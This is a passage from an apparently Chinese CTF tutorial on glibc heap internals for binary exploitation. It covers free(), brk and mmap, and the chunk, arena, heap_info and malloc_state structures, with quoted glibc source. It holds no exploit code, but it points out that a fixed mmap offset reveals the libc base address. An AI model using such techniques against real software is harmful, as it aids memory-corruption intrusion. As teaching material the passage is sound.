<code>ptr</code> 是一个空指针，则不会执行任何动作</p></li><li><p>当参数 <code>ptr</code> 已经被释放之后，再次释放会出现乱七八糟的效果（Double Free）</p></li><li><p>当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间（被 <code>mallopt</code> 禁用的情况下除外）</p></li></ul><p>还是以上面的例子来看，执行 <code>free()</code> 之后堆段并不会消失：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA4.png" alt="CTF - PWN_堆与堆溢出4.png"></p><p>但是堆中的内容发生了变化：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA5.png" alt="CTF - PWN_堆与堆溢出5.png"></p><p>我们申请的空间变成了 <code>Free chunk</code></p><blockquote><p>注意：新版本的 Glibc 对堆结构的管理有些区别，上图是在 Glibc 2.37 的 Kali Linux 2024.1 中进行的测试</p><p>而在 Glibc 2.23 的 Ubuntu 16.04 中是这样的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA7.png" alt="CTF - PWN_堆与堆溢出7.png"></p></blockquote><p>通过 <code>free()</code> 释放的堆块不会立刻被回收，它们会变成 <code>Free chunk</code> 并加上了一种 <code>xxx bin</code> 的名字，例如上图 Glibc 2.23 中的 <code>fastbins</code>（<code>fast bin</code>）</p><p><em>通常来说，当堆块释放后，如果与另一个被释放的堆块或者 <code>top chunk</code> 相邻，则这些空间会被合并</em>（<strong>但是 fast bin 是个特例，不会轻易合并</strong>）</p><hr><h3 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h3><blockquote><p>无论是 <code>malloc</code> 函数还是 <code>free</code> 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数</p><p>这些函数背后的系统调用主要是 <code>brk</code> 函数以及 <code>mmap</code> 函数</p></blockquote><ol><li><p><code>brk</code> 是将 DATA 数据段的最高地址指针 <code>_edata</code> 往高地址推（<code>_edata</code> 指向数据段的最高地址）</p></li><li><p><code>mmap</code> 是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存</p></li></ol><p><code>brk</code> 和 <code>mmap</code> 这两种方式分配的都是虚拟内存，没有分配物理内存</p><p>在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系</p><ul><li><code>malloc</code> 小于 <code>128k</code>（<code>0x20000</code> 字节）的内存时，使用 <code>brk</code> 分配内存</li><li><code>malloc</code> 大于等于 <code>128k</code>（<code>0x20000</code> 字节）的内存时，使用 <code>mmap</code> 分配内存，在堆和栈之间找一块空闲内存分配</li></ul><p>第一次执行 <code>malloc</code> 可能出现的系统调用如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA19.png" alt="CTF - PWN_堆与堆溢出19.png"></p><blockquote><p>注意：</p><p><code>brk</code> 会直接拓展原来的堆，<code>mmap</code> 会单独映射一块内存</p><p><strong><code>mmap</code> 分配的内存与 libc 基地址之前存在固定的偏移，因此可以推算出 libc 的基地址</strong></p></blockquote><hr><h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4><blockquote><p>对于堆的操作，操作系统提供了 <code>brk</code> 函数，Glibc 库提供了 <code>sbrk</code> 函数，我们可以通过增加 <code>brk</code> 的大小来向操作系统申请内存</p></blockquote><p>初始时，堆的起始地址 <code>start_brk</code> 以及堆的当前末尾 <code>brk</code> 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同：</p><ul><li>不开启 ASLR 保护时，<code>start_brk</code> 以及 <code>brk</code> 会指向 DATA&#x2F;BSS 段的结尾。</li><li>开启 ASLR 保护时，<code>start_brk</code> 以及 <code>brk</code> 也会指向同一位置，只是这个位置是在 DATA&#x2F;BSS 段结尾后的随机偏移处</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA18.png" alt="CTF - PWN_堆与堆溢出18.png"></p><hr><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><blockquote><p><code>malloc</code> 会使用 <code>mmap</code> 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用</p></blockquote><ul><li>在执行 <code>mmap</code> 之前，只有 <code>.so</code> 文件的 <code>mmap</code> 段</li><li>执行 <code>mmap</code> 之后，我们申请的内存与已经存在的内存段结合在了一起，构成了新的 <code>mmap</code> 段</li></ul><hr><h2 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h2><h3 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h3><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h4><blockquote><p><code>chunk</code> 也叫块，在内存中表示的意思就是一块内存，这块内存在 <code>ptmalloc2</code> 内部用 <code>malloc_chunk</code> 结构体来表示</p><p>在程序的执行过程中，我们称由 <code>malloc()</code> 申请的内存为 <code>chunk</code>，<code>chunk</code> 也是堆的最小操作单元</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/#malloc_chunk">堆相关数据结构 - CTF Wiki</a></p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA15.png" alt="CTF - PWN_堆与堆溢出15.png"></p><p><code>malloc_chunk</code> 的结构体定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*  This struct declaration is misleading (but accurate and necessary).  It declares a "view" into memory allowing access to necessary  fields at known offsets from a given base. See explanation below.*/</span><span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span> <span class="token punctuation">&#123;</span>  INTERNAL_SIZE_T      prev_size<span class="token punctuation">;</span>  <span class="token comment">/* Size of previous chunk (if free).  */</span>  INTERNAL_SIZE_T      size<span class="token punctuation">;</span>       <span class="token comment">/* Size in bytes, including overhead. */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd<span class="token punctuation">;</span>         <span class="token comment">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk<span class="token punctuation">;</span>  <span class="token comment">/* Only used for large blocks: pointer to next larger size.  */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一些参数的解释：</p><ul><li><p><code>prev_size</code></p><ol><li><p>如果该 <code>chunk</code> 的物理相邻的前一地址 <code>chunk</code>（两个指针的地址差值为前一个 <code>chunk</code> 的大小）是空闲的话，那么 <code>prev_size</code> 记录的是前一个 <code>chunk</code> 的大小（包括 <code>chunk</code> 头）</p></li><li><p>否则，<code>prev_size</code> 可以用来存储物理相邻的前一个 <code>chunk</code> 的数据。这里的前一个 <code>chunk</code> 指的是较低地址的 <code>chunk</code></p></li></ol></li><li><p><code>size</code></p><ol><li><p><code>size</code> 表示该 <code>chunk</code> 的大小，大小必须是 <code>2 * SIZE_SZ</code> 的整数倍。如果申请的内存大小不是 <code>2 * SIZE_SZ</code> 的整数倍，会被转换成满足大小的最小的 <code>2 * SIZE_SZ</code> 的倍数</p></li><li><p>32 位系统中，<code>SIZE_SZ</code> 是 4；64 位系统中，<code>SIZE_SZ</code> 是 8。 该字段的低三个比特位对 <code>chunk</code> 的大小没有影响，它们从高到低分别表示</p></li><li><p>一般来说，堆中第一个被分配的内存块的 <code>size</code> 字段的 <code>P</code> 位都会被设置为 1，以便于防止访问前面的非法内存；当一个 <code>chunk</code> 的 <code>size</code> 的 <code>P</code> 位为 0 时，我们能通过 <code>prev_size</code> 字段来获取上一个 <code>chunk</code> 的大小以及地址。这也方便进行空闲 <code>chunk</code> 之间的合并</p></li></ol></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th><th></th></tr></thead><tbody><tr><td align="left"><code>（A）NON_MAIN_ARENA</code></td><td align="left">记录当前 <code>chunk</code> 是否不属于主线程，1 表示不属于，0 表示属于</td><td></td></tr><tr><td align="left"><code>（M）IS_MAPPED</code></td><td align="left">记录当前 <code>chunk</code> 是否是由 <code>mmap</code> 分配的</td><td></td></tr><tr><td align="left"><code>（P）PREV_INUSE</code></td><td align="left">记录前一个 <code>chunk</code> 块是否被分配，0 表示空闲，1 表示使用中</td><td></td></tr></tbody></table><ul><li><p><code>fd、bk</code></p><ol><li><p><code>chunk</code> 处于分配状态时，从 <code>fd</code> 字段开始是用户的数据。<code>chunk</code> 空闲时，会被添加到对应的空闲管理链表中</p></li><li><p>通过 <code>fd</code> 和 <code>bk</code> 可以将空闲的 <code>chunk</code> 块加入到空闲的 <code>chunk</code> 块链表进行统一管理</p></li></ol></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>fd</code></td><td align="left">指向下一个（非物理相邻）空闲的 <code>chunk</code></td></tr><tr><td align="left"><code>bk</code></td><td align="left">指向上一个（非物理相邻）空闲的 <code>chunk</code></td></tr></tbody></table><ul><li><p><code>fd_nextsize、bk_nextsize</code></p><ol><li><p>只有 <code>chunk</code> 空闲的时候才使用，不过其用于较大的 <code>chunk</code>（<code>large chunk</code>）</p></li><li><p>一般空闲的 <code>large chunk</code> 在 <code>fd</code> 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历</strong></p></li></ol></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>fd_nextsize</code></td><td align="left">指向前一个与当前 <code>chunk</code> 大小不同的第一个空闲块，不包含 <code>bin</code> 的头指针</td></tr><tr><td align="left"><code>bk_nextsize</code></td><td align="left">指向后一个与当前 <code>chunk</code> 大小不同的第一个空闲块，不包含 <code>bin</code> 的头指针</td></tr></tbody></table><blockquote><p>注意：</p><p><strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong></p><p><em>虽然在分配状态和释放状态下，<code>chunk</code> 都是同一个数据结构，但是它们的表现形式是不一样的</em></p></blockquote><ul><li><code>chunk</code> 处于分配状态（<code>Allocated chunk</code>）：</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA9.png" alt="CTF - PWN_堆与堆溢出9.png"></p><p><strong>前两个字段称为 <code>chunk header</code>，后面的部分称为 <code>user data</code></strong></p><p><mark>每次 <code>malloc</code> 申请得到的内存指针，其实指向 <code>user data</code> 的起始处</mark></p><blockquote><p><code>chunk</code> 中的空间复用：</p><p>当一个 <code>chunk</code> 处于使用状态时，它的下一个 <code>chunk</code> 的 <code>prev_size</code> 域无效，所以下一个 <code>chunk</code> 的该部分也可以被当前 <code>chunk</code> 使用</p></blockquote><ul><li><code>chunk</code> 处于释放状态（<code>Freed chunk</code>）（可能是循环双向链表，也可能是单向链表）：</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA8.png" alt="CTF - PWN_堆与堆溢出8.png"></p><p>如果一个 <code>chunk</code> 处于 <code>free</code> 状态，那么会有两个位置记录其相应的大小：</p><ol><li>该 <code>chunk</code> 本身的 <code>size</code> 字段会记录</li><li>该 <code>chunk</code> 后面的一个 <code>chunk</code> 会记录</li></ol><blockquote><p>堆管理器会通过 <code>prev_size</code> 字段以及 <code>size</code> 字段合并两个物理相邻的空闲 <code>chunk</code> 块</p></blockquote><hr><h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><blockquote><p>程序第一次进行 <code>malloc</code> 的时候，<code>heap</code> 会被分为两块，一块给用户，剩下的那块就是 <code>top chunk</code>，简而言之，**<code>top chunk</code> 就是处于当前堆的物理地址最高的 <code>chunk</code>**</p><p><code>top chunk</code> 不属于任何一个 <code>bin</code>，它的作用在于：  </p><ol><li>当所有的 <code>bin</code> 都无法满足用户请求的大小时，如果 <code>top chunk</code> 不小于用户请求的大小，就从 <code>top chunk</code> 中进行分配，并将剩下的部分作为新的 <code>top chunk</code>  </li><li>否则，就对 <code>heap</code> 进行扩展后再进行分配（在 <code>main arena</code> 中通过 <code>sbrk</code> 扩展 <code>heap</code>，而在 <code>thread arena</code> 中通过 <code>mmap</code> 分配新的 <code>heap</code>）</li></ol></blockquote><ul><li>初始情况下，可以将 <code>unsorted chunk</code> 作为 <code>top chunk</code></li><li><code>top chunk</code> 的 <code>PREV_INUSE</code> 位始终为 1（否则其前面的 <code>chunk</code> 就会被合并到 <code>top chunk</code> 中）</li></ul><hr><h4 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h4><blockquote><p>在用户使用 <code>malloc</code> 请求分配内存时，<code>ptmalloc2</code> 找到的 <code>chunk</code> 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 <code>last remainder chunk</code></p></blockquote><ul><li><code>unsorted bin</code> 也会存这一块</li><li><code>top chunk</code> 分割剩下的部分不会作为 <code>last remainder</code></li></ul><hr><h3 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h3><h4 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h4><blockquote><p>无论是主线程还是新创建的线程，在第一次申请内存时，都会有独立的 <code>arena</code>，<code>arena</code> 就是用来管理线程中的这些堆的，也可以理解为堆管理器所持有的内存池</p></blockquote><ul><li>一个线程只有一个 <code>arnea</code>，并且这些线程的 <code>arnea</code> 都是独立的不是相同的</li></ul><p>但也不是每一个线程都会有对应的 <code>arena</code>，对于不同系统，<code>arena</code> 数量的约束如下：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">For 32 bit systems:     Number of arena = 2 * number of cores.For 64 bit systems:     Number of arena = 8 * number of cores.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>因为每个系统的核数是有限的，当线程数大于核数的二倍（超线程技术）时，就必然有线程处于等待状态，所以没有必要为每个线程分配一个 <code>arena</code></p><ul><li>主线程的 <code>arnea</code> 称为 <code>main_arena</code>，子线程的 <code>arnea</code> 称为 <code>thread_arena</code></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA16.png" alt="CTF - PWN_堆与堆溢出16.png"></p><ul><li>主线程无论一开始 <code>malloc</code> 多少空间，只要 <code>size &lt; 128KB</code>，<code>kernel</code> 都会分配 <code>132KB</code> 具有读写权限的 <code>heap segment</code>，这部分称为 <code>main_arena</code></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA17.png" alt="CTF - PWN_堆与堆溢出17.png"></p><p>例如这张图中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA2.png" alt="CTF - PWN_堆与堆溢出2.png"></p><p><code>heap segment</code> 地址为 <code>0x555555559000 ~ 0x55555557a000</code>，具有 <code>rw</code> 权限，总共：<code>(0x55555557a000 - 0x555555559000)B / 1024 = 132KB</code></p><blockquote><p>注意：</p><p><code>main_arena</code> 并不在申请的 <code>heap</code> 中，而是一个全局变量，在 <code>libc.so</code> 的数据段中</p></blockquote><p>后续申请的内存会一直从这个 <code>arena</code> 中获取，直到空间不足</p><p>当 <code>arena</code> 空间不足时，它可以通过增加 <code>brk</code> 的方式来增加堆的空间；类似地，<code>arena</code> 也可以通过减小 <code>brk</code> 来缩小自己的空间</p><p>即使将所有 <code>main_arena</code> 所分配出去的内存块 <code>free</code> 完，也不会立即还给 <code>kernel</code>，而是交由 Glibc 来管理。当后面程序再次申请内存时，在 Glibc 中管理的内存充足的情况下，Glibc 就会根据堆分配的算法来给程序分配相应的内存</p><hr><h4 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h4><blockquote><p>程序刚开始执行时，每个线程是没有 <code>heap</code> 区域的。当其申请内存时，就需要 <code>heap_info</code> 这个结构来记录对应的信息</p><p>当该 <code>heap</code> 的资源被使用完后，就必须得再次申请内存了。此外，一般申请的 <code>heap</code> 是不连续的，因此需要记录不同 <code>heap</code> 之间的链接结构</p></blockquote><ul><li><p><strong><code>heap_info</code> 这个数据结构是专门为从 <code>Memory Mapping Segment</code> 处申请的内存准备的，即为非主线程准备的</strong></p></li><li><p>主线程可以通过 <code>sbrk()</code> 函数扩展 <code>program break location</code> 获得（直到触及 <code>Memory Mapping Segment</code>），只有一个 <code>heap</code>，没有 <code>heap_info</code> 数据结构</p></li></ul><p><code>heap_info</code> 的主要结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">HEAP_MIN_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">HEAP_MAX_SIZE</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">ifdef</span> <span class="token expression">DEFAULT_MMAP_THRESHOLD_MAX</span></span><span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">define</span> <span class="token macro-name">HEAP_MAX_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> DEFAULT_MMAP_THRESHOLD_MAX<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">else</span></span><span class="token macro property"><span class="token directive-hash">#</span>  <span class="token directive keyword">define</span> <span class="token macro-name">HEAP_MAX_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span> </span><span class="token comment">/* must be a power of two */</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token comment">/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps   that are dynamically created for multi-threaded programs.  The   maximum size must be a power of two, for fast determination of   which heap belongs to a chunk.  It should be much larger than the   mmap threshold, so that requests with a size just below that   threshold can be fulfilled without creating too many heaps.  */</span><span class="token comment">/***************************************************************************/</span><span class="token comment">/* A heap is a single contiguous memory region holding (coalesceable)   malloc_chunks.  It is allocated with mmap() and always starts at an   address aligned to HEAP_MAX_SIZE.  */</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_heap_info</span><span class="token punctuation">&#123;</span>  mstate ar_ptr<span class="token punctuation">;</span> <span class="token comment">/* Arena for this heap. */</span>  <span class="token keyword">struct</span> <span class="token class-name">_heap_info</span> <span class="token operator">*</span>prev<span class="token punctuation">;</span> <span class="token comment">/* Previous heap. */</span>  size_t size<span class="token punctuation">;</span>   <span class="token comment">/* Current size in bytes. */</span>  size_t mprotect_size<span class="token punctuation">;</span> <span class="token comment">/* Size in bytes that has been mprotected                           PROT_READ|PROT_WRITE.  */</span>  <span class="token comment">/* Make sure the following data is properly aligned, particularly     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of     MALLOC_ALIGNMENT. */</span>  <span class="token keyword">char</span> pad<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">&amp;</span> MALLOC_ALIGN_MASK<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> heap_info<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该结构主要是描述堆的基本信息，包括：</p><ul><li>堆对应的 <code>arena</code> 的地址</li><li>由于一个线程申请一个堆之后，可能会使用完，之后就必须得再次申请。因此，一个线程可能会有多个堆。<code>prev</code> 即记录了上一个 <code>heap_info</code> 的地址。这里可以看到每个堆的 <code>heap_info</code> 是通过单向链表进行链接的</li><li><code>size</code> 表示当前堆的大小</li><li><code>pad</code> 确保分配的空间是按照 <code>MALLOC_ALIGN_MASK + 1</code> 对齐的</li></ul><hr><h4 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h4><blockquote><p><code>malloc_state</code> 结构用于管理堆，记录每个 <code>arena</code> 当前申请的内存的具体状态，例如：是否有空闲 <code>chunk</code>，空闲 <code>chunk</code> 的大小等等</p></blockquote><ul><li>无论是 <code>thread_arena</code> 还是 <code>main_arena</code>，它们都只有一个 <code>malloc state</code> 结构</li><li>由于 <code>thread</code> 的 <code>arena</code> 可能有多个，<code>malloc state</code> 结构会在最新申请的 <code>arena</code> 中</li></ul><p><code>malloc_state</code> 的结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* Serialize access.  */</span>    <span class="token function">__libc_lock_define</span><span class="token punctuation">(</span><span class="token punctuation">,</span> mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Flags (formerly in max_fast).  */</span>    <span class="token keyword">int</span> flags<span class="token punctuation">;</span>    <span class="token comment">/* Fastbins */</span>    mfastbinptr fastbinsY<span class="token punctuation">[</span> NFASTBINS <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>    mchunkptr top<span class="token punctuation">;</span>    <span class="token comment">/* The remainder from the most recent split of a small request */</span>    mchunkptr last_remainder<span class="token punctuation">;</span>    <span class="token comment">/* Normal bins packed as described above */</span>    mchunkptr bins<span class="token punctuation">[</span> NBINS <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> binmap<span class="token punctuation">[</span> BINMAPSIZE <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* Linked list, points to the next arena */</span>    <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>    <span class="token comment">/* Linked list for free arenas.  Access to this field is serialized       by free_list_lock in arena.c.  */</span>    <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next_free<span class="token punctuation">;</span>    <span class="token comment">/* Number of threads attached to this arena.  0 if the arena is on       the free list.  Access to this field is serialized by       free_list_lock in arena.c.  */</span>    INTERNAL_SIZE_T attached_threads<span class="token punctuation">;</span>    <span class="token comment">/* Memory allocated from the system in this arena.  */</span>    INTERNAL_SIZE_T system_mem<span class="token punctuation">;</span>    INTERNAL_SIZE_T max_system_mem<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>libc_lock_define(, mutex)</code><br>  该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。</li><li><code>flags</code><br>  <code>flags</code> 记录了分配区的一些标志，比如 <code>bit0</code> 记录了分配区是否有 <code>fast bin chunk</code>，<code>bit1</code> 标识分配区是否能返回连续的虚拟地址空间。具体如下：</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/*   FASTCHUNKS_BIT held in max_fast indicates that there are probably   some fastbin chunks. It is set true on entering a chunk into any   fastbin, and cleared only in malloc_consolidate.   The truth value is inverted so that have_fastchunks will be true   upon startup (since statics are zero-filled), simplifying   initialization checks. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FASTCHUNKS_BIT</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1U</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">have_fastchunks</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> FASTCHUNKS_BIT<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clear_fastchunks</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token function">catomic_or</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags<span class="token punctuation">,</span> FASTCHUNKS_BIT<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_fastchunks</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token function">catomic_and</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags<span class="token punctuation">,</span> <span class="token operator">~</span>FASTCHUNKS_BIT<span class="token punctuation">)</span></span></span><span class="token comment">/*   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous   regions.  Otherwise, contiguity is exploited in merging together,   when possible, results from consecutive MORECORE calls.   The initial value comes from MORECORE_CONTIGUOUS, but is   changed dynamically if mmap is ever used as an sbrk substitute. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NONCONTIGUOUS_BIT</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">2U</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">contiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> NONCONTIGUOUS_BIT<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">noncontiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">&amp;</span> NONCONTIGUOUS_BIT<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_noncontiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token operator">-></span>flags <span class="token operator">|=</span> NONCONTIGUOUS_BIT<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_contiguous</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>M<span class="token 